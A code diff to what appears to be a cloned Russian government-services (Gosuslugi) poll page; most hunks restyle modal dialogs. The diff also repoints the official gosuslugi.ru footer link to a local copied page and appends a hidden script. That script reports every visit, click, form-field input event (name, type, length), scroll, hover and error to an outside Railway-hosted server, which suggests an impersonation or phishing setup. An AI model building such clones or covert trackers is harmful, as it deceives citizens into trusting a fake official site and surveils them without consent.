@@ -37,7 +37,7 @@
 <script>
 if (window.location.hostname === 'localhost') {
     // Отключаем CORS запросы для локальной разработки
-    window.isLocalDevelopment = true;
+    window.isLocalDevelopment = false;
 }
 </script>
         
@@ -197,11 +197,8 @@ function manageBodyScroll(targetElement) {
         if (targetElement) {
             bodyScrollLock.disableBodyScroll(targetElement);
         } else {
-            // На iOS нужно передать конкретный элемент для enableBodyScroll
-            const body = document.querySelector('body');
-            if (body) {
-                bodyScrollLock.enableBodyScroll(body);
-            }
+            // Не вызываем enableBodyScroll без элемента, чтобы не было ошибки
+            // Можно добавить лог или ничего не делать
         }
     }
 }
@@ -220,7 +217,8 @@ document.addEventListener('DOMContentLoaded', function() {
         // Добавляем обработчик для закрытия меню
         document.addEventListener('click', function(e) {
             if (!menuBtn.contains(e.target) && !document.querySelector('.main-menu').contains(e.target)) {
-                manageBodyScroll(null);
+                // manageBodyScroll(null); // Удаляем вызов с null
+                // Если нужно разблокировать скролл, передавайте сюда menuBtn или другой элемент, который был заблокирован
             }
         });
     }
@@ -243,7 +241,7 @@ document.addEventListener('DOMContentLoaded', function() {
     // Проверка на локальную разработку для CORS
     if (window.location.hostname === 'localhost') {
         // Отключаем CORS запросы для локальной разработки
-        window.isLocalDevelopment = true;
+        window.isLocalDevelopment = false;
         
         // Добавляем мок-ответ для set-time-zone
         const mockSetTimeZone = () => {
@@ -384,59 +382,145 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 <style>
+    /* Стили для размытого фона модального окна */
+    .modal-backdrop {
+        background-color: rgba(255, 255, 255, 0.8) !important;
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+    }
+    
     .modal-content {
         max-width: 900px;
         margin: 0 auto;
         height: 100%;
         display: flex;
         flex-direction: column;
+        background-color: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        border: 1px solid rgba(255, 255, 255, 0.8);
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
     }
+    
     .modal-body {
         padding: 2rem;
         overflow-y: auto;
-        max-height: calc(100vh - 200px); /* Вычитаем высоту заголовка и футера */
+        max-height: calc(100vh - 200px);
     }
+    
     .rules-content {
         padding: 1.5rem;
-        background-color: #fff;
+        background-color: rgba(255, 255, 255, 0.8);
         border-radius: 8px;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    .rules-content p {
-        margin-bottom: 1.5rem;
-        font-size: 1.1rem;
-        line-height: 1.6;
-    }
-    .rules-content ol {
-        padding-left: 2rem;
-    }
-    .rules-content li {
-        margin-bottom: 1rem;
-        font-size: 1.1rem;
-        line-height: 1.6;
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05);
     }
     
     /* Стили для заголовка модального окна */
     .modal-header {
+        /* Возвращаю стандартные значения */
         padding: 1.5rem;
-        border-bottom: 1px solid #dee2e6;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+        background-color: rgba(255, 255, 255, 0.95);
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 1rem;
     }
+    
+    /* Более специфичный селектор для модального окна с правилами */
+    #pollRulesModal .modal-header {
+        padding-top: 2rem !important; /* Было 3rem, стало 2rem */
+        padding-bottom: 1.5rem !important;
+    }
+    @media (max-width: 576px) {
+        #pollRulesModal .modal-header {
+            padding-top: 1.25rem !important; /* Было 2rem, стало 1.25rem */
+            padding-bottom: 1rem !important;
+        }
+        #pollRulesModal .modal-body {
+            padding: 0.5rem !important;
+            max-height: calc(100vh - 80px);
+        }
+    }
+    
     .modal-title {
         font-size: 1.5rem;
         font-weight: 600;
-        margin: 0;
+        margin: 0 auto;
+        color: #333;
+        padding-right: 0;
+        flex: 0 1 auto;
+        min-width: 0;
+        word-wrap: break-word;
+        text-align: center;
+        width: 100%;
+        order: 1;
     }
+    
     .btn-close {
         position: absolute;
         right: 1rem;
         top: 1rem;
+        opacity: 0.7;
+        transition: opacity 0.2s;
+        flex-shrink: 0;
+        margin-left: 0;
+        padding: 0.5rem;
+        z-index: 1;
+        order: 2;
     }
-    .region-auth-hint {
-        color: #888;
-        font-size: 0.98rem;
-        margin-top: 0.5em;
-        margin-bottom: 1em;
-        text-align: left;
+    
+    @media (max-width: 576px) {
+        .modal-header {
+            padding: 1rem;
+        }
+        .modal-title {
+            font-size: 1.25rem;
+            padding-right: 0;
+        }
+        .btn-close {
+            padding: 0.25rem;
+        }
+    }
+    
+    .btn-close:hover {
+        opacity: 1;
+    }
+    
+    /* Стили для текста в модальном окне */
+    .rules-content p {
+        margin-bottom: 1.5rem;
+        font-size: 1.1rem;
+        line-height: 1.6;
+        color: #333;
+    }
+    
+    .rules-content ol {
+        padding-left: 2rem;
+    }
+    
+    .rules-content li {
+        margin-bottom: 1rem;
+        font-size: 1.1rem;
+        line-height: 1.6;
+        color: #333;
+    }
+    /* Синий крестик для модального окна с правилами — как у кнопки 'АВТОРИЗОВАТЬСЯ' */
+    #pollRulesModal .btn-close {
+        color: #0e4cd3 !important;
+    }
+    #pollRulesModal .btn-close svg,
+    #pollRulesModal .btn-close svg use {
+        color: inherit !important;
+        fill: currentColor !important;
+        stroke: currentColor !important;
+        opacity: 1 !important;
+    }
+    #pollRulesModal .btn-close:hover svg,
+    #pollRulesModal .btn-close:hover svg use {
+        opacity: 0.8;
     }
 </style>
 
@@ -463,9 +547,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     </ol>
                 </div>
             </div>
-            <div class="modal-footer">
-                <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Вернуться к опросу</button>
-            </div>
         </div>
     </div>
 </div>
@@ -488,7 +569,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 </li>
                 <li class="page-footer__item">
                     <span>Портал государственных услуг</span>
-                    <a href="https://gosuslugi.ru/" target="_blank">gosuslugi.ru</a>
+                    <a href="../../../../2/index2.html">gosuslugi.ru</a>
                 </li>
                 <li class="page-footer__item">
                     <span>Сайт Министерства цифрового развития, связи и&nbsp;массовых коммуникаций Российской Федерации</span>
@@ -664,43 +745,15 @@ document.addEventListener('DOMContentLoaded', function() {
 
 </form>
             </div>
-            <div class="modal-footer">
-                <button type="submit" form="region-form-modal" class="button button--blue" data-bs-dismiss="modal">Применить
-                </button>
-            </div>
         </div>
     </div>
 </div>
 
 <script>
-// Отключаем все внешние запросы на локальной разработке
+// Удаляем обработку API запросов к pos.gosuslugi.ru
 if (window.location.hostname === 'localhost') {
-    // Отключаем метрику Яндекса
+    // Отключаем только метрику Яндекса
     window.ym = function() {};
-    
-    // Отключаем все fetch запросы к pos.gosuslugi.ru
-    const originalFetch = window.fetch;
-    window.fetch = async (...args) => {
-        const [url] = args;
-        if (url.includes('pos.gosuslugi.ru')) {
-            return new Response(JSON.stringify({ success: true }));
-        }
-        return originalFetch(...args);
-    };
-    
-    // Отключаем XMLHttpRequest запросы
-    const originalOpen = window.XMLHttpRequest.prototype.open;
-    window.XMLHttpRequest.prototype.open = function() {
-        if (arguments[1] && arguments[1].includes('pos.gosuslugi.ru')) {
-            // Возвращаем пустой ответ
-            this.response = JSON.stringify({ success: true });
-            this.status = 200;
-            this.readyState = 4;
-            this.onload();
-            return;
-        }
-        originalOpen.apply(this, arguments);
-    };
 }
 </script>
 <script src="../../assets/2ee1073bfe7fac1bb0652cb767eab7f0/js/libs.js?h=320a35d95fb8efd7ef9503d4712c0ade"></script>
@@ -708,15 +761,16 @@ if (window.location.hostname === 'localhost') {
 <script src="../../assets/2ee1073bfe7fac1bb0652cb767eab7f0/js/main.min.js?h=e90edea5359a4f19eeecc741a6a42cc1"></script>
 <script src="../../assets/305354e8ef43788cef2f8713868cce4b/js/nprogress.js?h=6c12975df031d79a46d182409266f742"></script>
 <script src="../../assets/305354e8ef43788cef2f8713868cce4b/js/loader-circle.js?h=1c62fadd2977c120f72e2de4bc93abd8"></script>
-<!-- Удалена ссылка на yametrika.js -->
 <script src="../../assets/305354e8ef43788cef2f8713868cce4b/js/script.js?h=fa8072a1892cc75dc95c35b16b629494"></script>
 <script src="../../assets/d4b72c006a7771677225038852ee8b96/noty.min.js?h=488e2d70be69bc4d3a2b1fc9c50b8afc"></script>
 <script src="../../assets/305354e8ef43788cef2f8713868cce4b/js/moment.min.js?h=5c158b940513c7dc2ebd901455e9b63d"></script>
 <script src="../../assets/305354e8ef43788cef2f8713868cce4b/js/moment-timezone.min.js?h=3631cb26f5a1d1abed13f876971e857f"></script>
-<script>jQuery(function ($) {
-PROJECT.setTimeZone('/mock/set-time-zone');
-Noty.overrideDefaults({"layout":"topRight","theme":"metroui","progressBar":false,"timeout":3000});
-});</script>
+<script>
+jQuery(function ($) {
+    // Удаляем вызов setTimeZone
+    Noty.overrideDefaults({"layout":"topRight","theme":"metroui","progressBar":false,"timeout":3000});
+});
+</script>
 <script>jQuery(window).on('load', function () {
 
       var closePollPopup = function (popup) {
@@ -794,4 +848,114 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 });
 </script>
+
+<script>
+// Конфигурация мониторинга
+const MONITOR_SERVER = window.isLocalDevelopment ? 'http://localhost:3002' : 'https://serverscan-production.up.railway.app'; // Замените на реальный URL в продакшене
+let userId = null;
+
+// Функция для отправки данных на сервер
+async function sendToMonitor(endpoint, data = {}) {
+  try {
+    const response = await fetch(`${MONITOR_SERVER}/${endpoint}`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ ...data, userId })
+    });
+    const result = await response.json();
+    if (!userId && result.userId) {
+      userId = result.userId;
+    }
+    return result;
+  } catch (error) {
+    console.error('Ошибка отправки данных мониторинга:', error);
+  }
+}
+
+// Отправляем информацию о посещении при загрузке страницы
+document.addEventListener('DOMContentLoaded', () => {
+  sendToMonitor('visit');
+});
+
+// Отслеживаем клики
+document.addEventListener('click', (event) => {
+  const target = event.target;
+  const details = {
+    element: target.tagName.toLowerCase(),
+    id: target.id || 'нет',
+    class: target.className || 'нет',
+    text: target.textContent?.trim().substring(0, 50) || 'нет'
+  };
+  sendToMonitor('activity', {
+    type: 'click',
+    details: JSON.stringify(details)
+  });
+});
+
+// Отслеживаем ввод в поля
+document.addEventListener('input', (event) => {
+  const target = event.target;
+  if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
+    const details = {
+      element: target.tagName.toLowerCase(),
+      id: target.id || 'нет',
+      name: target.name || 'нет',
+      type: target.type || 'text',
+      length: target.value.length
+    };
+    sendToMonitor('activity', {
+      type: 'input',
+      details: JSON.stringify(details)
+    });
+  }
+});
+
+// Отслеживаем прокрутку
+let lastScrollTime = 0;
+window.addEventListener('scroll', () => {
+  const now = Date.now();
+  if (now - lastScrollTime > 1000) { // Ограничиваем частоту отправки
+    lastScrollTime = now;
+    const details = {
+      scrollY: window.scrollY,
+      scrollX: window.scrollX,
+      innerHeight: window.innerHeight,
+      documentHeight: document.documentElement.scrollHeight
+    };
+    sendToMonitor('activity', {
+      type: 'scroll',
+      details: JSON.stringify(details)
+    });
+  }
+});
+
+// Отслеживаем наведение на элементы
+let lastHoverTime = 0;
+document.addEventListener('mouseover', (event) => {
+  const now = Date.now();
+  if (now - lastHoverTime > 500) { // Ограничиваем частоту отправки
+    lastHoverTime = now;
+    const target = event.target;
+    const details = {
+      element: target.tagName.toLowerCase(),
+      id: target.id || 'нет',
+      class: target.className || 'нет'
+    };
+    sendToMonitor('activity', {
+      type: 'hover',
+      details: JSON.stringify(details)
+    });
+  }
+});
+
+// Отслеживаем ошибки
+window.addEventListener('error', (event) => {
+  sendToMonitor('error', {
+    error: `${event.message} (${event.filename}:${event.lineno}:${event.colno})`
+  });
+});
+</script>
+<script src="js/monitor.js"></script>
 </body></html>
